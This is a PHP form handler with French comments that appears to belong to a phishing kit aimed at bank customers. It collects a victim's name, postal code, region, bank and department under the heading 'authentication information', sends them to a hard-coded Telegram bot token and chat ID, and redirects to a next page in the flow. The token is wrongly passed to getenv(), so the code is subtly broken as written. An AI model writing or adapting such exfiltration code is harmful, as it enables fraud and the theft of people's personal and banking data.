<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Récupérer et valider les données du formulaire
    $nom = htmlspecialchars($_POST['nom']);
    $prenom = htmlspecialchars($_POST['prenom']);
    $codePostal = htmlspecialchars($_POST['code-postal']);
    $region = htmlspecialchars($_POST['region']);
    $banque = htmlspecialchars($_POST['banque']);
    $departement = htmlspecialchars($_POST['departement']);
    // ... (Récupérer et valider les autres champs non sensibles) ...

    // Construire le message Telegram
    $message = "Informations d'authentification :\n";
    $message .= "Nom : " . $nom . "\n";
    $message .= "Prénom : " . $prenom . "\n";
    $message .= "Code Postal : " . $codePostal . "\n";
    $message .= "Région : " . $region . "\n";
    $message .= "Banque : " . $banque . "\n";
    $message .= "Département : " . $departement . "\n";
    // ... (Ajouter les autres informations non sensibles) ...

    // Récupérer le token depuis une variable d'environnement
    $telegramBotToken = getenv('7727944499:AAHpgP9-xAAbtGZpBrYBfaX_FbkZiWVeEtw');
    $telegramChatId = '7263826117';

    // Envoyer le message à Telegram
    $telegramUrl = "https://api.telegram.org/bot" . $telegramBotToken . "/sendMessage?chat_id=" . $telegramChatId . "&text=" . urlencode($message);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    // Vérifier la réponse de Telegram
    $response = json_decode($result, true);
    if ($response && $response['ok']) {
        // Rediriger vers la page 4 en cas de succès
        header('Location: page4.html');
        exit;
    } else {
        // Gérer l'erreur en affichant un message à l'utilisateur
        echo "Erreur lors de l'envoi du message à Telegram. Veuillez réessayer.";
    }
}
?>